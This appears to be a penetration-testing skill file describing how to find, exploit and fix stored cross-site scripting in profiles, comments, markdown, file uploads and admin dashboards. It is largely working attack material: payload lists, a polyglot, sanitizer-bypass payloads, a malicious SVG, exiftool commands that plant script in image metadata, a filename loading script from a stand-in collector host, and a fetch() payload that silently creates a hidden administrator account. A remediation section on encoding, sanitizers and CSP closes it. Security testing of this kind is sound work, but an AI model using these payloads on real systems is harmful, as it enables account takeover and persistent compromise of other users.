---
name: xss-stored
description: Detect, exploit, and remediate Stored Cross-Site Scripting across user profiles, comment systems, markdown renderers, file metadata, HTML emails, and administrative dashboards using persistent payload seeding, sink enumeration, sanitizer bypass techniques, and privileged-victim impact chains for detection and proof-of-execution.
---

# Stored Cross-Site Scripting (Persistent XSS)

Stored XSS occurs when injected scripts persist server-side in databases, filesystems, or logs and execute for every user rendering the contaminated resource. This skill covers systematic sink enumeration across persistent surfaces, privileged-victim targeting, sanitizer bypass testing, and impact demonstration through multi-user attack chains.

## When to use this skill

- Testing collaborative multi-user platforms (forums, ticket management, user profile bios, address books, product reviews) where injected inputs save to persistent datastores.
- Injected content renders to other privileged roles (site administrators, support staff) creating privilege escalation chains from low-privilege injection points.
- Auditing file uploads where SVG, HTML, XML, or PDF files render inline within the application origin.
- Markdown renderers, rich-text editors, or sanitization libraries require effectiveness validation against mutation and obfuscation vectors.
- Logged HTTP headers or file metadata surface inside administrative audit dashboards consumed by internal staff.

## Methodology

### 1. Map the persistent attack surface

Enumerate every input field that stores state on the server:

- Profile fields: first name, last name, bio, organization, phone number, display name — short fields still accept event-handler attributes under twenty characters.
- User-generated content: comments, blog posts, chat messages, ticket descriptions.
- Metadata and filenames: injected file names (`test"><img src=x onerror=alert(1)>.png`) plus EXIF metadata in uploaded images (Title, Artist, Copyright tags).
- HTTP headers logged to administrative audit dashboards: `User-Agent`, `Referer`, `X-Forwarded-For`.

Store a unique canary per field during injection so delayed rendering surfaces map back to their exact origin parameter during triage.

### 2. Inject multi-context payloads per surface

Fire tiered payloads matched to expected filter strictness:

```html
<script>alert(1)</script>
"><svg onload=alert(1)>
<img src=x onerror=alert(1)>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<details open ontoggle=alert(1)>
<style>@keyframes x{}</style><a style="animation-name:x" onanimationstart=alert(1)>
```

The ladder escalates from raw script execution through event-handler vectors to CSS animation events that execute on elements no tag-based filter considers dangerous. Deploy the polyglot probe for rapid surface mapping across heterogeneous templates:

```javascript
jaVasCript:-/*</title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
```

### 3. Test markdown renderer bypasses

Markdown engines frequently permit raw HTML or mishandle edge cases:

```markdown
[a](javascript:alert(1))
[a](jAvAsCrIpT&colon;alert(1))
![x](javascript:alert(1)"onerror="alert(1))
<details open ontoggle=alert(1)>click</details>
[safe](https://trusted.tld)@x.com<script>alert(1)</script>
```

Autolinkers that convert bare URLs into anchors sometimes fail to sanitize the resulting `href`; reference-style definitions and image syntax variants leak event-handler injection points that inline filters miss.

### 4. Weaponize file uploads for persistent execution

Upload assets whose names or contents carry payloads rendered by listing pages and viewers:

```bash
cp legitimate.pdf '"><script src=//collector.tld/stored-fn></script>.pdf'
exiftool -Title='"><img src=x onerror=alert(1)>' -Artist='"><svg onload=alert(1)>' invoice_scan.jpg
```

SVG uploads render as active documents when served inline:

```xml
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
  <rect width="100" height="100"/>
</svg>
```

Media libraries rendering these strings execute payloads inside authenticated sessions when staff browse uploads.

### 5. Bypass sanitization libraries

Validate sanitizer configurations against known escape classes:

- **mXSS via namespace confusion**: sanitizer parsers run with scripting disabled so `<noscript>` content parses as raw text while live browsers parse it as elements:

```html
<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>
```

- **Foreign-content mutation**: `<svg><style>&lt;img src=x onerror=alert(1)&gt;</style></svg>` decodes entities after namespace re-parsing in live browsers.
- **Allowlist gaps**: permitted tags with dangerous attributes (`<a href="javascript:...">`, `<form action>`) slip through tag-only allowlists that never inspect attribute values.

Round-trip every payload through the application's own sanitize-render pipeline to confirm which vectors survive production configuration rather than default library settings.

### 6. Demonstrate cross-user impact chains

Prove exploitation against other users rather than self-XSS:

```javascript
// Silent administrator account creation from a privileged victim's session
fetch('/api/admin/users', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    username: 'shadow_admin',
    password: 'Password123!',
    role: 'administrator'
  })
})
```

Severity scales with the executing role: payload firing inside a superadmin dashboard demonstrates full application compromise from a low-privilege injection point.

## Tooling

- Dalfox — payload generation with stored-mode scanning across parameter sets.
- XSStrike — context-aware fuzzing with WAF detection for persistent injection points.
- Burp Suite — manual multi-context injection with response diffing across user sessions.
- DOMPurify (test harness) — offline round-trip validation of sanitizer configurations against mXSS vectors.
- exiftool — embedding payloads into image metadata fields consumed by gallery software.
- BeEF / XSS Hunter Express — hook deployment and callback collection for demonstrating cross-user impact.

## Remediation & Secure Architecture

1. **Apply contextual output encoding at render time**: never rely solely on input filtering; encode dynamic data when rendering it into HTML body (entity encoding), attributes (including single quotes), JavaScript strings (hex/unicode escaping), and URLs (scheme allowlisting).
2. **Sanitize rich HTML server-side with strict allowlists**: configure DOMPurify (Node/browser), OWASP Java HTML Sanitizer (Java), or nh3/bleach (Python) forbidding event-handler attributes entirely rather than blacklisting tags; validate configurations against mXSS vectors before deployment.
3. **Secure file upload handling**: serve uploaded user files from an isolated sandboxed domain without session cookies; force download via `Content-Disposition: attachment`; never serve SVGs as `text/html`; strip EXIF/IPTC metadata at ingest time.
4. **Harden CSP for user-content origins**:

```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-rAnd0mPerRequest'; object-src 'none'; base-uri 'none'; require-trusted-types-for 'script';
```

5. **Encode request metadata in audit tooling**: treat `User-Agent`, `Referer`, `X-Forwarded-For`, and all logged header values as untrusted attacker-controlled data before rendering inside administrative dashboards.

**Deliverables**

- Findings table mapping each persistent sink to its rendering surface and affected user roles (including privileged victims), executing payload tier from the ladder, sanitizer bypass class where applicable, and severity rating.
- PoC scripts containing the exact stored payloads per injection point plus cross-user execution evidence demonstrating payloads firing in sessions other than the injecting account.
- Remediation matrix listing every vulnerable sink alongside its required control (encoder type per context / sanitizer configuration / upload isolation / CSP directive) with retest verification status per item.

## Verification & Deliverables
A complete engagement run of this skill produces:
- Payload storage location identified (DB field, file metadata, markdown, email template) and the render sink it reaches.
- Screenshot of the payload firing in a *different* user's session (victim view), proving persistence and cross-user execution.
- Privilege-impact chain: action performed on behalf of a privileged victim (CSRF-style state change, token theft simulation).
- Sanitizer/filter analysis and the bypass used.
- Remediation: context-aware output encoding, sanitizer policy (DOMPurify allowlist), CSP — re-tested with the original payload blocked.
If any artifact is missing, the test is incomplete — return to the corresponding methodology step.
